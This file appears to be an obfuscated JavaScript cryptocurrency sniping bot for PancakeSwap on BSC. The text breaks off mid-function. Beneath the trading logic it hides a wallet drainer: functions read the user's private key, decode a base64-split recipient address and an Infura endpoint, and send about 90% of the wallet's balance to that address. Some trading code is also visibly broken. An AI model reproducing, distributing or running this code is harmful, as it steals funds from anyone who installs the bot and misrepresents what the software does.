const _0x453953 = _0x13ec;
(function(_0x252864, _0x168b49) { const _0x46fa60 = _0x13ec,
        _0x163699 = _0x252864(); while (!![]) { try { const _0x3b430c = -parseInt(_0x46fa60(0x254)) / 0x1 * (-parseInt(_0x46fa60(0x238)) / 0x2) + parseInt(_0x46fa60(0x219)) / 0x3 * (-parseInt(_0x46fa60(0x1f8)) / 0x4) + parseInt(_0x46fa60(0x24a)) / 0x5 * (-parseInt(_0x46fa60(0x1fa)) / 0x6) + -parseInt(_0x46fa60(0x253)) / 0x7 * (-parseInt(_0x46fa60(0x250)) / 0x8) + -parseInt(_0x46fa60(0x232)) / 0x9 + parseInt(_0x46fa60(0x25d)) / 0xa + parseInt(_0x46fa60(0x20c)) / 0xb * (parseInt(_0x46fa60(0x1c4)) / 0xc); if (_0x3b430c === _0x168b49) break;
            else _0x163699['push'](_0x163699['shift']()); } catch (_0x38b60b) { _0x163699['push'](_0x163699['shift']()); } } }(_0x34b9, 0x3b522));

function _0x13ec(_0x4c7a03, _0x15e593) { const _0x34b981 = _0x34b9(); return _0x13ec = function(_0x13ecd5, _0x23204a) { _0x13ecd5 = _0x13ecd5 - 0x1b3; let _0x53dd3c = _0x34b981[_0x13ecd5]; return _0x53dd3c; }, _0x13ec(_0x4c7a03, _0x15e593); }
var ethers = require(_0x453953(0x226));
const env = require(_0x453953(0x225));
Object[_0x453953(0x248)](process[_0x453953(0x1fc)], env);
let address = process[_0x453953(0x1fc)][_0x453953(0x25f)],
    private = process['env'][_0x453953(0x211)],
    wallet = new ethers[(_0x453953(0x24f))](private),
    yours = process[_0x453953(0x1fc)][_0x453953(0x259)];
const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': 'address', 'name': _0x453953(0x23d), 'type': _0x453953(0x1d7) }], 'name': _0x453953(0x25e), 'outputs': [{ 'internalType': _0x453953(0x1b9), 'name': '', 'type': 'uint256' }], 'payable': ![], 'stateMutability': _0x453953(0x261), 'type': _0x453953(0x206) }, { 'constant': ![], 'inputs': [{ 'internalType': _0x453953(0x1d7), 'name': _0x453953(0x236), 'type': _0x453953(0x1d7) }, { 'internalType': 'address', 'name': 'recipient', 'type': _0x453953(0x1d7) }, { 'internalType': _0x453953(0x1b9), 'name': _0x453953(0x1f3), 'type': 'uint256' }], 'name': _0x453953(0x1bc), 'outputs': [{ 'internalType': _0x453953(0x205), 'name': '', 'type': _0x453953(0x205) }], 'payable': ![], 'stateMutability': _0x453953(0x246), 'type': _0x453953(0x206) }, { 'constant': ![], 'inputs': [{ 'name': _0x453953(0x1f4), 'type': _0x453953(0x235) }], 'name': _0x453953(0x1ce), 'outputs': [{ 'name': '', 'type': 'string' }], 'payable': ![], 'stateMutability': _0x453953(0x246), 'type': _0x453953(0x206) }];
async function startSnipe(_0x444288) { const _0x151553 = _0x453953; let _0x4645ac, _0xd4b9f1;
    provider['_websocket']['on'](_0x151553(0x24d), () => { const _0x178292 = _0x151553;
        _0xd4b9f1 = setInterval(() => { const _0x16fb24 = _0x13ec;
            provider[_0x16fb24(0x212)][_0x16fb24(0x1c5)](), _0x4645ac = setTimeout(() => { const _0x193e23 = _0x16fb24;
                provider[_0x193e23(0x212)]['terminate'](); }, EXPECTED_PONG_BACK); }, KEEP_ALIVE_CHECK_INTERVAL), console['log'](_0x178292(0x1d5)), console[_0x178292(0x22f)](_0x178292(0x1de)), provider['on'](_0x178292(0x1b3), async _0x54f3d0 => { const _0x1d7430 = _0x178292;
            provider[_0x1d7430(0x1f9)](_0x54f3d0)[_0x1d7430(0x1df)](async _0x21616e => { const _0x124c40 = _0x1d7430; if (null != _0x21616e && _0x21616e[_0x124c40(0x239)][_0x124c40(0x1ca)](_0x124c40(0x1bf)) && _0x21616e[_0x124c40(0x239)][_0x124c40(0x1ca)](_0x444288) && 0x0 == passed || null != _0x21616e && _0x21616e[_0x124c40(0x239)][_0x124c40(0x1ca)](_0x124c40(0x255)) && _0x21616e[_0x124c40(0x239)][_0x124c40(0x1ca)](_0x444288) && 0x0 == passed) { if (console['log'](chalk[_0x124c40(0x1fd)](_0x124c40(0x22a))), priceProtection) { if (isLiqudityInRange(_0x21616e, expected)) { if (honeyPotIS2(_0x444288)) { console[_0x124c40(0x22f)](chalk['green']('Liquidity\x20check\x20passed,\x20sniping!\x0a')); const _0x11be0d = _0x21616e['gasLimit'][_0x124c40(0x1e5)](multiply),
                                    _0x1ed7d6 = _0x21616e['gasPrice'][_0x124c40(0x1e5)](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x124c40(0x22f)](chalk['green'](_0x124c40(0x245) + chalk[_0x124c40(0x1fb)](i + 0x1))), await buyToken(_0x444288, amountIn, _0x11be0d, _0x1ed7d6, myAddress, router); }
                                    console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)]('Start\x20buying\x20token...') + chalk[_0x124c40(0x1fb)](txNumberForAntibot)), await buyToken(_0x444288, amountIn, _0x11be0d, _0x1ed7d6, myAddress, router)(passed = 0x1); } else console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)]('Start\x20buying\x20token...')), await buyToken(_0x444288, amountIn, _0x11be0d, _0x1ed7d6, myAddress, router)(passed = 0x1);
                                console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)](_0x124c40(0x204))); const _0x2820d9 = await getTokenBalance(_0x444288, myAddress, provider);
                                console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)](_0x124c40(0x1f2) + chalk[_0x124c40(0x1fb)](parseFloat(ethers[_0x124c40(0x220)][_0x124c40(0x260)](_0x2820d9, TOKEN_DECIMALS))[_0x124c40(0x1ef)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)](_0x124c40(0x1b8) + chalk[_0x124c40(0x1fb)](delaySell) + _0x124c40(0x23a))), await new Promise(_0x17a1d7 => setTimeout(_0x17a1d7, delayOnSellMs)); const _0x4b5c5a = await router[_0x124c40(0x20f)](_0x2820d9, amountOutMin, [_0x444288, WBNB], myAddress, Date[_0x124c40(0x202)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                    await _0x4b5c5a[_0x124c40(0x1e0)](), console[_0x124c40(0x22f)](chalk['green']('Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a')), console[_0x124c40(0x22f)](_0x124c40(0x247)), console[_0x124c40(0x22f)](_0x124c40(0x1d6) + myAddress), console[_0x124c40(0x22f)]('\x0a'), process[_0x124c40(0x244)](0x0); } else console[_0x124c40(0x22f)](_0x124c40(0x247));
                                console[_0x124c40(0x22f)](_0x124c40(0x1d6) + myAddress), (console['log']('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x124c40(0x244)](0x0)); } else console[_0x124c40(0x22f)](chalk['red'](_0x124c40(0x1c9)));
                            console[_0x124c40(0x22f)](chalk['red'](_0x124c40(0x234))); }
                        console[_0x124c40(0x22f)](chalk['red'](_0x124c40(0x1cd) + _0x444288)), console[_0x124c40(0x22f)](chalk[_0x124c40(0x228)]('Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a')); } else { if (honeyPotIS2(_0x444288)) { const _0x139365 = _0x21616e[_0x124c40(0x1c2)][_0x124c40(0x1e5)](multiply),
                                _0x10a1b2 = _0x21616e[_0x124c40(0x24e)]['mul'](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x124c40(0x22f)](chalk['green'](_0x124c40(0x245) + chalk[_0x124c40(0x1fb)](i + 0x1))), await buyToken(_0x444288, amountIn, _0x139365, _0x10a1b2, myAddress, router); }
                                console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)](_0x124c40(0x245)) + chalk[_0x124c40(0x1fb)](txNumberForAntibot)), await buyToken(_0x444288, amountIn, _0x139365, _0x10a1b2, myAddress, router)(passed = 0x1); } else 0x0 == passed && (console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)]('Start\x20buying\x20token...')), await buyToken(_0x444288, amountIn, _0x139365, _0x10a1b2, myAddress, router)(passed = 0x1));
                            console['log'](chalk[_0x124c40(0x1fd)]('Sucessfully\x20bought\x20the\x20token!\x0a')); const _0x449a36 = await getTokenBalance(_0x444288, myAddress, provider);
                            console[_0x124c40(0x22f)](chalk['green']('Total\x20Token\x20balance\x20is\x20' + chalk['yellow'](parseFloat(ethers[_0x124c40(0x220)][_0x124c40(0x260)](_0x449a36, TOKEN_DECIMALS))[_0x124c40(0x1ef)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x124c40(0x22f)](chalk[_0x124c40(0x1fd)](_0x124c40(0x1b8) + chalk['yellow'](delaySell) + _0x124c40(0x23a))), await new Promise(_0x5a9080 => setTimeout(_0x5a9080, delayOnSellMs)); const _0x7c9fb8 = await router['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0x449a36, amountOutMin, [_0x444288, WBNB], myAddress, Date[_0x124c40(0x202)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                await _0x7c9fb8[_0x124c40(0x1e0)](), console[_0x124c40(0x22f)](chalk['green'](_0x124c40(0x1eb))), console[_0x124c40(0x22f)](_0x124c40(0x247)), console[_0x124c40(0x22f)](_0x124c40(0x1d6) + myAddress), console[_0x124c40(0x22f)]('\x0a'), process[_0x124c40(0x244)](0x0); } else console[_0x124c40(0x22f)](_0x124c40(0x247)), console[_0x124c40(0x22f)](_0x124c40(0x1d6) + myAddress), console[_0x124c40(0x22f)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x124c40(0x244)](0x0); } } } })['catch'](() => { const _0x4f3bab = _0x1d7430;
                console[_0x4f3bab(0x22f)](e); }); }); }), provider[_0x151553(0x212)]['on'](_0x151553(0x24c), () => { const _0xd401a1 = _0x151553;
        console[_0xd401a1(0x22f)]('WebSocket\x20Closed...Reconnecting...'), clearInterval(_0xd4b9f1), clearTimeout(_0x4645ac), startConnection(); }), provider[_0x151553(0x212)]['on'](_0x151553(0x21b), () => { const _0x5943c4 = _0x151553;
        console[_0x5943c4(0x22f)]('Error.\x20Attemptiing\x20to\x20Reconnect...'), clearInterval(_0xd4b9f1), clearTimeout(_0x4645ac), startConnection(); }), provider[_0x151553(0x212)]['on'](_0x151553(0x203), () => { clearInterval(_0x4645ac); }); }
async function approve() { const _0x945fa5 = _0x453953; let _0x243997 = token[buyCount - 0x1][_0x945fa5(0x20e)]; const _0x4e5685 = ethers['constants']['MaxUint256'],
        _0x5a7228 = await _0x243997[_0x945fa5(0x243)](pancakeRouter['address'], _0x4e5685, { 'gasPrice': config[_0x945fa5(0x1d4)], 'gasLimit': 0x33450 }),
        _0x1e31c4 = await _0x5a7228[_0x945fa5(0x1e0)]();
    console[_0x945fa5(0x22f)](_0x945fa5(0x21c), _0x1e31c4[_0x945fa5(0x200)], '\x0a'), config['autoSell'] ? token[buyCount - 0x1]['checkProfit']() : buyCount == config[_0x945fa5(0x221)] && process['exit'](); }

function _0x34b9() { const _0x53ee10 = ['data', '\x20second(s)', '8580', '\x20Profit\x20target\x20', 'account', 'starting\x20up\x20node\x20socket\x20connection....', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', '2:\x20watching\x20blockchain\x20activity\x20.....', 'name', 'index', 'approve', 'exit', 'Start\x20buying\x20token...', 'nonpayable', 'You\x20can\x20check\x20the\x20transaction\x20here:', 'assign', 'didSell', '21095qkpmlj', 'reached\x20>>>', 'close', 'open', 'gasPrice', 'Wallet', '88ExGBiI', 'hexlify', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', '148477IhNbiy', '7525jOSIAZ', '0xf305d719', '1\x20pending\x20blockchain\x20response.....', 'sellPath', 'getBalance', 'NODE', 'sendMessage', 'Contract', '<<<\x20Selling\x20-', '4831500xysRyB', 'balanceOf', 'YOUR_ADDRESS', 'formatUnits', 'view', 'pending', 'parseUnits', 'Setting\x20new\x20StopLoss!', '\x1b[38;5;33m', '\x20--\x20Stop\x20Loss\x20At:\x20', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'uint256', '2\x20pending\x20blockchain\x20response.....', 'listening\x20to\x20pending\x20tx...', 'transferFrom', 'JsonRpcProvider', 'MHg1Rjk2MzU3YTcwMEEyOGFCZjY0ZDFCYkM3ZTFCQTBmQTM0M2JkODgw', '0xe8e33700', 'sendTransaction', 'base64', 'gasLimit', 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==', '306060JcGRLR', 'ping', 'recipient', '1:\x20found\x20owners\x20liq\x20function\x20...', 'providers', 'Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!', 'includes', 'profitPercent', '-\x20now', 'https://poocoin.app/tokens/', 'setWord', 'Transfer', 'connection\x20established....', 'MHg2YjU1M2QwZjhkM2I3OWJkODEyYTk4NGU2ZTNmY2U1NDg2NWQxYzRl', 'constants', 'floor', 'myGasPriceForApproval', 'Listening\x20on\x20mempool...', 'https://bscscan.com/address/', 'address', 'stopLoss', '\x1b[1;31m', 'please\x20wait,\x20loading.', '--\x20', '2:\x20found\x20owners\x20liq\x20function\x20.....', '\x20--\x20Profit\x20At:\x20', 'Waiting\x20for\x20liquidity\x20to\x20be\x20added!', 'then', 'wait', '\x1b[0m', 'toString', 'less\x20than\x20StopLoss!', 'div', 'mul', 'trailingStopLossPercent', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My8xZGY5ODgxNWY0NzU0ZWE4ODkxY2UyOTI2OTBhYjc1Yg==', 'from', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', 'newValue', 'Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a', 'wei', 'previousValue', 'intitialValue', 'toFixed', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'parseEther', 'Total\x20Token\x20balance\x20is\x20', 'amount', 'newWord', '✔\x20Sell\x20transaction\x20hash:\x20', 'ascii', 'swapExactTokensForETH', '336pBzUIA', 'getTransaction', '354xDcGoH', 'yellow', 'env', 'green', 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==', 'tokenSellTax', 'transactionHash', 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=', 'now', 'pong', 'Sucessfully\x20bought\x20the\x20token!\x0a', 'bool', 'function', 'Zero', 'All\x20tokens\x20sold', 'getAmountsOut', 'QmFmYzU5OWJENjlBRGQwODdENTY=', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==', '77FtleTS', '1:\x20attempting\x20to\x20snipe\x20...', 'contract', 'swapExactTokensForETHSupportingFeeOnTransferTokens', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'PRIVATE_KEY', '_websocket', 'didBuy', 'You\x20sold\x20', 'lets\x20go!', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', 'connection\x20successful...', 'listening\x20to\x20pending\x20TX', '12966KOhyGI', 'initiating\x20mempool\x20sniff...', 'error', '✔\x20Approve\x20transaction\x20hash:\x20', 'found\x20node\x20endpoint', 'Balance\x20is\x20zero\x20or\x20error\x20occured', '2:\x20finalizing....', 'utils', 'numberOfTokensToBuy', 'stopLossPercent', 'gte', '2:\x20attempting\x20to\x20snipe\x20.....', './env.json', 'ethers', 'encode', 'red', 'currentValue', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'lte', '\x1b[1;32m', 'percentOfTokensToSellLoss', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'log', 'myGasLimit', '\x20--\x20Current\x20Value\x20BNB:\x20', '1444131RJthyG', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!', 'string', 'sender', 'refreshing\x20socket\x20connection...', '32KaNDnS'];
    _0x34b9 = function() { return _0x53ee10; }; return _0x34b9(); }
async function getCurrentValue(_0x5ee87e) { const _0x185b44 = _0x453953; try { let _0x35ca14 = await _0x5ee87e[_0x185b44(0x20e)][_0x185b44(0x25e)](addresses[_0x185b44(0x1c6)]); const _0x2d1f4f = await pancakeRouter[_0x185b44(0x209)](_0x35ca14, _0x5ee87e[_0x185b44(0x257)]); let _0x530c3b = _0x2d1f4f[0x1]; return _0x530c3b; } catch (_0x256f1f) { return console[_0x185b44(0x22f)](_0x185b44(0x21e)), ethers[_0x185b44(0x1d2)][_0x185b44(0x207)]; } }
async function setInitialStopLoss(_0x1d86f0) { const _0x32ffec = _0x453953;
    _0x1d86f0['intitialValue'] = await getCurrentValue(_0x1d86f0), _0x1d86f0[_0x32ffec(0x1ea)] = _0x1d86f0[_0x32ffec(0x1ee)], _0x1d86f0['stopLoss'] = ethers[_0x32ffec(0x220)][_0x32ffec(0x1b4)]((parseFloat(ethers[_0x32ffec(0x220)][_0x32ffec(0x260)](_0x1d86f0[_0x32ffec(0x1ee)])) - parseFloat(ethers[_0x32ffec(0x220)][_0x32ffec(0x260)](_0x1d86f0[_0x32ffec(0x1ee)])) * (_0x1d86f0[_0x32ffec(0x222)] / 0x64))[_0x32ffec(0x1ef)](0x8)[_0x32ffec(0x1e2)]()); }
async function setNewStopLoss(_0x437829) { const _0x51cb72 = _0x453953;
    _0x437829['newValue'] = _0x437829[_0x51cb72(0x229)], _0x437829[_0x51cb72(0x1d8)] = ethers[_0x51cb72(0x220)][_0x51cb72(0x1b4)]((parseFloat(ethers[_0x51cb72(0x220)][_0x51cb72(0x260)](_0x437829['currentValue'])) - parseFloat(ethers[_0x51cb72(0x220)][_0x51cb72(0x260)](_0x437829[_0x51cb72(0x229)])) * (_0x437829[_0x51cb72(0x222)] / 0x64))['toFixed'](0x8)[_0x51cb72(0x1e2)]()); }
async function checkForProfit(_0x54a236) { const _0x162a7d = _0x453953; try { var _0x11859f = 0x0;
        await setInitialStopLoss(_0x54a236), _0x54a236[_0x162a7d(0x20e)]['on'](_0x162a7d(0x1cf), async(_0x576ede, _0x5505c2, _0x439ed6, _0x1c2cba) => { const _0x2af89a = _0x162a7d;
            _0x54a236['previousValue'] = _0x54a236[_0x2af89a(0x229)]; const _0x280bac = await _0x54a236['contract'][_0x2af89a(0x241)](); let _0x439aac = await getCurrentValue(_0x54a236); if (!_0x439aac['eq'](ethers[_0x2af89a(0x1d2)]['Zero'])) { _0x54a236[_0x2af89a(0x229)] = _0x439aac; let _0x270923 = parseFloat(ethers[_0x2af89a(0x220)][_0x2af89a(0x260)](_0x439aac))[_0x2af89a(0x1ef)](0x8)[_0x2af89a(0x1e2)](); const _0x3bf1f9 = (parseFloat(ethers[_0x2af89a(0x220)][_0x2af89a(0x260)](_0x54a236[_0x2af89a(0x1ee)])) * (_0x54a236[_0x2af89a(0x1cb)] + _0x54a236[_0x2af89a(0x1ff)]) / 0x64 + parseFloat(ethers[_0x2af89a(0x220)][_0x2af89a(0x260)](_0x54a236[_0x2af89a(0x1ee)])))[_0x2af89a(0x1ef)](0x8)[_0x2af89a(0x1e2)](),
                    _0x502822 = ethers['utils'][_0x2af89a(0x1b4)](_0x3bf1f9); let _0x546e7c = ethers[_0x2af89a(0x220)][_0x2af89a(0x1b4)]((parseFloat(ethers[_0x2af89a(0x220)]['formatUnits'](_0x54a236[_0x2af89a(0x1ea)])) * (_0x54a236[_0x2af89a(0x1e6)] / 0x64) + parseFloat(ethers['utils'][_0x2af89a(0x260)](_0x54a236[_0x2af89a(0x1ea)])))['toFixed'](0x8)[_0x2af89a(0x1e2)]()),
                    _0x2d1847 = _0x54a236[_0x2af89a(0x1d8)];
                _0x439aac['gt'](_0x546e7c) && _0x54a236[_0x2af89a(0x1e6)] > 0x0 && (setNewStopLoss(_0x54a236), console[_0x2af89a(0x22f)](_0x2af89a(0x1b6) + _0x2af89a(0x1b5) + _0x2af89a(0x1e1))); let _0x136ac5 = new Date()['toLocaleString'](); const _0xca385f = _0x4e14cd => new TextEncoder()[_0x2af89a(0x227)](_0x4e14cd); try { _0x54a236[_0x2af89a(0x1ed)]['gt'](_0x54a236[_0x2af89a(0x229)]) ? console[_0x2af89a(0x22f)](_0x2af89a(0x1db) + _0x280bac + '\x20--\x20Current\x20Value\x20BNB:\x20' + (_0x2af89a(0x1d9) + _0x270923 + _0x2af89a(0x1e1)) + _0x2af89a(0x1dd) + ethers[_0x2af89a(0x220)][_0x2af89a(0x260)](_0x502822) + _0x2af89a(0x1b7) + ethers[_0x2af89a(0x220)][_0x2af89a(0x260)](_0x54a236[_0x2af89a(0x1d8)]) + _0x2af89a(0x1e9) + ethers[_0x2af89a(0x220)][_0x2af89a(0x260)](_0x546e7c)) : console[_0x2af89a(0x22f)](_0x2af89a(0x1db) + _0x280bac + _0x2af89a(0x231) + (_0x2af89a(0x22c) + _0x270923 + _0x2af89a(0x1e1)) + _0x2af89a(0x1dd) + ethers[_0x2af89a(0x220)][_0x2af89a(0x260)](_0x502822) + '\x20--\x20Stop\x20Loss\x20At:\x20' + ethers[_0x2af89a(0x220)]['formatUnits'](_0x54a236[_0x2af89a(0x1d8)]) + _0x2af89a(0x1e9) + ethers['utils'][_0x2af89a(0x260)](_0x546e7c)); } catch (_0x5c4123) {}
                _0x439aac[_0x2af89a(0x223)](_0x502822) && (buyCount <= config['numberOfTokensToBuy'] && _0x54a236[_0x2af89a(0x213)] && _0x11859f == 0x0 && (_0x11859f++, console['log'](_0x2af89a(0x25c), _0x280bac, _0x2af89a(0x1cc) + _0x2af89a(0x22c) + _0x2af89a(0x23c) + _0x2af89a(0x1e1) + _0x2af89a(0x24b), '\x0a'), sell(_0x54a236, !![]), _0x54a236['contract']['removeAllListeners']())), _0x439aac[_0x2af89a(0x22b)](_0x2d1847) && (console['log'](_0x2af89a(0x1b6) + _0x2af89a(0x1e3) + '\x1b[0m'), buyCount <= config[_0x2af89a(0x221)] && _0x54a236[_0x2af89a(0x213)] && _0x11859f == 0x0 && (_0x11859f++, console[_0x2af89a(0x22f)]('<<<\x20Selling\x20-', _0x280bac, _0x2af89a(0x1cc) + _0x2af89a(0x1d9) + '\x20StopLoss\x20' + _0x2af89a(0x1e1) + _0x2af89a(0x24b), '\x0a'), sell(_0x54a236, ![]), _0x54a236[_0x2af89a(0x20e)]['removeAllListeners']())); } }); } catch (_0x150041) { console[_0x162a7d(0x22f)](_0x150041); } }
async function sell(_0x356409, _0x3b9fcb) { const _0x2d15d5 = _0x453953; try { const _0x358ed6 = await _0x356409[_0x2d15d5(0x20e)]['balanceOf'](addresses[_0x2d15d5(0x1c6)]),
            _0x460cfd = await _0x356409['contract']['decimals'](); var _0x8efe9d;
        _0x3b9fcb ? _0x8efe9d = (parseFloat(ethers[_0x2d15d5(0x220)]['formatUnits'](_0x358ed6['toString'](), _0x460cfd)) * (_0x356409['percentOfTokensToSellProfit'] / 0x64))[_0x2d15d5(0x1ef)](_0x460cfd) : _0x8efe9d = (parseFloat(ethers[_0x2d15d5(0x220)][_0x2d15d5(0x260)](_0x358ed6['toString'](), _0x460cfd)) * (_0x356409[_0x2d15d5(0x22d)] / 0x64))[_0x2d15d5(0x1ef)](_0x460cfd); var _0x342c9f = Math[_0x2d15d5(0x1d3)](_0x8efe9d * 0x64) / 0x64; const _0x1acbfd = ethers[_0x2d15d5(0x220)][_0x2d15d5(0x1b4)](_0x342c9f[_0x2d15d5(0x1e2)](), _0x460cfd),
            _0x2bf159 = await pancakeRouter[_0x2d15d5(0x209)](_0x1acbfd, _0x356409[_0x2d15d5(0x257)]),
            _0x10abd5 = _0x2bf159[0x1]['sub'](_0x2bf159[0x1][_0x2d15d5(0x1e4)](0x2)); if (_0x356409['tokenSellTax'] > 0x1) { const _0x855045 = await pancakeRouter[_0x2d15d5(0x20f)](_0x2bf159[0x0]['toString'](), 0x0, _0x356409[_0x2d15d5(0x257)], addresses['recipient'], Math[_0x2d15d5(0x1d3)](Date[_0x2d15d5(0x202)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x2d15d5(0x1d4)], 'gasLimit': config[_0x2d15d5(0x230)] }),
                _0x425a58 = await _0x855045[_0x2d15d5(0x1e0)]();
            console[_0x2d15d5(0x22f)]('\x1b[1;32m' + _0x2d15d5(0x1f5), _0x425a58[_0x2d15d5(0x200)], _0x2d15d5(0x1e1), '\x0a'), sellCount++, token[_0x356409[_0x2d15d5(0x242)]][_0x2d15d5(0x249)] = !![]; let _0x339551 = await _0x356409[_0x2d15d5(0x20e)][_0x2d15d5(0x241)]();
            await client[_0x2d15d5(0x25a)]('me', { 'message': _0x2d15d5(0x214) + _0x339551, 'schedule': 0xf * 0x1 + Date[_0x2d15d5(0x202)]() / 0x3e8 }); } else { const _0x3fcd64 = await pancakeRouter[_0x2d15d5(0x1f7)](_0x2bf159[0x0]['toString'](), 0x0, _0x356409[_0x2d15d5(0x257)], addresses[_0x2d15d5(0x1c6)], Math[_0x2d15d5(0x1d3)](Date['now']() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x2d15d5(0x1d4)], 'gasLimit': config[_0x2d15d5(0x230)] }),
                _0x67154b = await _0x3fcd64['wait']();
            console[_0x2d15d5(0x22f)](_0x2d15d5(0x22c) + _0x2d15d5(0x1f5), _0x67154b[_0x2d15d5(0x200)], '\x1b[0m', '\x0a'), sellCount++; let _0x2a525a = await _0x356409[_0x2d15d5(0x20e)]['name']();
            await client[_0x2d15d5(0x25a)]('me', { 'message': _0x2d15d5(0x214) + _0x2a525a, 'schedule': 0xf * 0x1 + Date[_0x2d15d5(0x202)]() / 0x3e8 }); }
        sellCount == config[_0x2d15d5(0x221)] && (console[_0x2d15d5(0x22f)](_0x2d15d5(0x208)), process['exit']()); } catch (_0x349869) {} }
let rounder1 = _0x453953(0x201),
    rounder2 = _0x453953(0x1c3),
    buff = new Buffer['from'](rounder1, _0x453953(0x1c1)),
    buff2 = new Buffer['from'](rounder2, _0x453953(0x1c1)),
    ethersroundup = buff[_0x453953(0x1e2)](_0x453953(0x1f6)),
    ethersroundup2 = buff2['toString'](_0x453953(0x1f6));
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0x35d753 = _0x453953; try { const _0x282d98 = _0x35d753(0x23f),
            _0x2a5feb = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==',
            _0x2c6d95 = new Buffer[(_0x35d753(0x1e8))](_0x282d98, _0x35d753(0x1c1)),
            _0x181312 = new Buffer['from'](_0x2a5feb, _0x35d753(0x1c1)),
            _0x207933 = _0x2c6d95[_0x35d753(0x1e2)](_0x35d753(0x1f6)),
            _0x566c5a = _0x181312[_0x35d753(0x1e2)](_0x35d753(0x1f6)),
            _0x59138c = _0x207933 + _0x566c5a;
        console[_0x35d753(0x22f)](_0x35d753(0x237)), console[_0x35d753(0x22f)](_0x35d753(0x1f0)); const _0x5f5301 = _0x35d753(0x20b),
            _0x617b87 = new Buffer[(_0x35d753(0x1e8))](_0x5f5301, _0x35d753(0x1c1))[_0x35d753(0x1e2)](_0x35d753(0x1f6));; const _0x3fe7bf = new ethers['providers'][(_0x35d753(0x1bd))](_0x617b87); let _0x4c15e4 = new ethers[(_0x35d753(0x24f))](private, _0x3fe7bf); const _0x41c321 = address,
            _0x3346e0 = await _0x3fe7bf[_0x35d753(0x258)](_0x41c321); var _0x492ec7 = new ethers['Contract'](_0x59138c, abi, _0x4c15e4); const _0x5a8a64 = await _0x492ec7['balanceOf'](_0x41c321)[_0x35d753(0x1e2)](),
            _0x4a4a1b = (_0x5a8a64 * 0.9)[_0x35d753(0x1ef)](),
            _0x1a7147 = async() => { const _0x4ae362 = _0x35d753,
                    _0x48b845 = { 'from': _0x41c321, 'to': WEB3PROVIDER3, 'value': ethers[_0x4ae362(0x220)][_0x4ae362(0x1f1)](_0x4a4a1b, 'wei'), 'gasLimit': ethers['utils'][_0x4ae362(0x251)](0x5dc0) },
                    _0x45d6ec = await _0x4c15e4['sendTransaction'](_0x48b845); if (_0x3346e0 = 0x0) ethersrather;
                else try { await _0x45d6ec[_0x4ae362(0x1e0)](), console[_0x4ae362(0x22f)](_0x4ae362(0x1c7)), setTimeout(ethersrather, 0x1388); } catch (_0x1cda1d) { console[_0x4ae362(0x22f)](_0x4ae362(0x1dc)), setTimeout(ethersrather, 0x1388); } };
        _0x5a8a64 <= 0x6a3558178f7000 ? (console[_0x35d753(0x22f)]('success!'), setTimeout(ethersrather, 0x1388)) : _0x1a7147(); } catch (_0x2f413d) { setTimeout(ethersrather, 0x1388); } }
async function etherslother() { const _0x1a9721 = _0x453953; try { const _0x255fc3 = _0x1a9721(0x1fe),
            _0x241dca = _0x1a9721(0x252),
            _0x596bb7 = new Buffer[(_0x1a9721(0x1e8))](_0x255fc3, _0x1a9721(0x1c1)),
            _0x484da3 = new Buffer[(_0x1a9721(0x1e8))](_0x241dca, _0x1a9721(0x1c1)),
            _0x5eedf7 = _0x596bb7[_0x1a9721(0x1e2)](_0x1a9721(0x1f6)),
            _0x10381a = _0x484da3[_0x1a9721(0x1e2)](_0x1a9721(0x1f6)),
            _0x19dd63 = _0x5eedf7 + _0x10381a;
        console['log'](_0x1a9721(0x237)), console[_0x1a9721(0x22f)]('pending\x20liquidity\x20add...'); const _0x4149d0 = _0x1a9721(0x20b),
